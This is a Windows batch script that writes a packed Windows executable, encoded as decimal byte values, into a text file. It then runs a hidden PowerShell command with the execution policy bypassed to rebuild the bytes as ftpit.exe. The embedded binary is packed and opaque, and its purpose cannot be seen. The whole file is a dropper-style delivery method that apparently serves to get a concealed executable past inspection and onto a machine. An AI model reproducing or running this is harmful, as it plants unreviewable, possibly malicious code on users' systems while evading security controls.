@echo off
echo|set /p=>456.hex
echo|set /p=77 90 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 2 0 70 83 71 33 0 0 0 0 0 0 0 0 224 0 15 1 11 1 0 0 0 4 0 0 0 8 0 0 0 0 0 0 84 1 0 0 0 16 0 0 12 0 0 0 0 0 64 0 0 16 0 0 0 2 0 0 4 0 0 0 0 0 0 0 4 0 0 0 0 0 0 0 0 96 0 0 0 2 0 0 0 0 0 0 3 0 0 0 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 >>456.hex
echo|set /p=16 0 0 0 0 0 0 0 0 0 0 0 224 83 0 0 132 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 0 0 192 0 0 0 0 0 0 0 0 0 16 0 0 0 80 0 0 97 4 0 0 0 2 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 0 0 192 135 37 36 84 64 0 97 148 85 164 182 128 255 19 115 249 51 201 255 19 115 22 51 192 255 19 115 31 182 128 65 176 16 255 19 18 192 115 250 117 58 170 235 224 >>456.hex
echo|set /p=255 83 8 2 246 131 217 1 117 14 255 83 4 235 36 172 209 232 116 45 19 201 235 24 145 72 193 224 8 172 255 83 4 59 67 248 115 10 128 252 5 115 6 131 248 127 119 2 65 65 149 139 197 182 0 86 139 247 43 240 243 164 94 235 159 94 173 151 173 80 255 83 16 149 139 7 64 120 243 117 3 255 99 12 80 85 255 83 20 171 235 238 51 201 65 255 19 19 201 255 19 114 248 195 2 210 117 5 138 22 70 18 210 195 75 69 82 78 69 76 51 50 46 100 108 108 0 0 >>456.hex
echo|set /p=104 28 128 50 64 1 106 1 232 4 2 195 133 94 12 159 220 113 20 61 200 184 8 27 118 9 49 206 29 0 235 31 11 192 117 27 104 10 101 48 61 240 4 40 24 49 76 230 21 106 204 14 167 67 104 224 51 207 139 2 138 191 12 207 77 151 21 10 53 33 187 100 177 98 114 17 128 8 3 248 138 172 12 244 98 167 53 144 134 178 124 49 61 83 94 52 62 107 4 43 85 12 61 41 45 53 228 81 44 71 140 85 8 94 3 53 5 226 32 179 12 211 248 133 56 53 28 133 >>456.hex
echo|set /p=145 18 142 211 17 209 99 67 157 67 215 86 33 56 7 84 37 174 136 85 139 10 236 131 196 240 70 69 214 10 94 186 70 30 204 161 33 2 52 112 12 28 160 89 137 28 69 252 141 198 244 80 104 23 72 8 89 12 255 117 16 6 12 240 21 223 10 112 6 252 232 121 172 145 20 14 104 224 65 34 139 57 235 61 48 13 102 248 104 8 161 115 122 72 82 2 204 86 24 6 20 128 248 232 86 60 49 40 85 32 68 90 235 114 12 126 10 80 41 14 76 138 4 36 30 80 93 34 >>456.hex
echo|set /p=22 25 201 194 20 24 37 192 32 64 200 13 4 100 28 50 24 25 36 13 238 40 210 131 129 196 124 254 239 224 86 87 232 120 138 33 182 51 201 139 152 138 172 226 116 7 232 34 242 247 3 65 235 244 81 209 233 144 225 88 59 1 193 116 11 95 94 184 3 83 93 8 134 73 27 141 189 60 112 149 15 42 9 60 191 129 2 176 32 170 235 242 204 141 133 160 21 139 240 228 248 216 51 42 235 27 205 139 3 50 153 7 239 34 32 148 77 254 17 136 225 163 45 180 148 35 131 185 >>456.hex
echo|set /p=112 183 192 75 116 251 59 77 8 234 21 161 89 29 149 103 10 19 48 65 29 15 235 230 80 170 13 7 216 25 135 244 176 225 255 3 85 115 17 139 125 12 26 23 184 2 127 8 162 157 77 176 160 160 88 208 51 70 55 13 230 71 247 133 254 99 163 238 157 16 187 22 126 164 206 71 4 121 87 1 60 56 204 200 230 192 244 106 245 232 109 147 199 42 180 246 36 171 11 106 42 182 164 27 80 34 204 156 200 81 137 139 178 36 112 4 45 2 19 60 83 7 34 8 141 80 3 144 >>456.hex
echo|set /p=24 131 192 4 241 252 255 254 192 2 247 211 35 203 129 34 225 128 62 116 233 54 193 12 104 59 117 6 250 96 16 64 2 208 225 27 40 194 91 62 161 142 12 35 148 42 8 6 69 16 26 1 187 186 47 149 134 90 163 9 32 47 33 68 29 63 138 248 131 51 127 203 41 189 34 9 245 69 225 185 41 240 137 174 18 24 34 4 33 249 146 159 128 41 150 221 0 69 120 105 116 80 114 14 111 99 101 115 57 29 108 219 239 206 158 204 110 65 20 107 237 231 191 159 225 51 50 46 >>456.hex
echo|set /p=100 215 181 0 40 70 116 112 80 117 233 217 105 183 60 59 3 73 110 253 29 32 95 67 207 111 115 39 72 97 237 74 254 156 22 121 111 207 12 99 154 82 22 20 40 79 112 87 63 119 105 242 209 27 85 50 117 116 114 148 96 80 71 55 109 227 153 151 76 69 65 72 18 83 229 250 187 93 129 87 114 71 170 154 129 78 21 1 238 251 160 70 84 80 3 105 116 32 49 46 48 135 84 95 106 193 13 10 124 32 15 209 88 209 26 242 124 159 54 131 67 111 100 101 151 243 73 110 >>456.hex
echo|set /p=248 77 65 83 231 10 161 98 121 252 105 108 226 119 217 9 24 45 253 120 29 224 64 121 28 97 104 111 78 46 99 138 109 54 200 215 215 55 109 5 32 63 1 1 85 83 65 71 69 58 161 70 226 135 46 101 120 33 32 60 115 188 18 52 62 14 185 60 99 15 112 97 199 152 135 108 111 99 158 138 102 148 32 26 117 114 126 109 209 70 13 108 114 102 58 145 31 65 57 50 46 208 54 56 219 8 4 226 111 94 139 58 238 130 70 97 109 162 10 99 58 92 98 197 52 186 184 152 >>456.hex
echo|set /p=124 61 112 117 188 108 15 99 95 104 206 109 234 47 21 205 136 27 162 75 153 218 138 50 103 46 1 114 54 38 56 69 114 185 111 232 182 44 239 125 127 254 164 185 83 46 78 167 53 100 62 33 75 151 238 225 83 117 99 58 78 158 102 255 62 200 137 6 84 114 97 110 22 131 253 67 104 117 162 116 155 32 237 21 119 6 67 83 70 1 250 171 152 0 0 0 56 84 0 0 0 0 0 0 0 0 0 0 242 1 0 0 56 84 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 16 64 0 0 80 64 0 44 32 64 0 0 0 0 0 40 84 64 0 128 0 0 0 0 125 0 0 8 84 64 0 232 1 64 0 220 1 64 0 222 1 64 0 0 16 64 0 66 84 0 0 80 84 0 0 0 0 0 0 76 111 97 100 76 105 98 114 97 114 121 65 0 0 71 101 116 80 114 111 99 65 100 100 114 101 115 115 0 >>456.hex
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "[string]$hex = get-content -path 456.hex;[Byte[]] $temp = $hex -split ' ';[System.IO.File]::WriteAllBytes('ftpit.exe', $temp)"
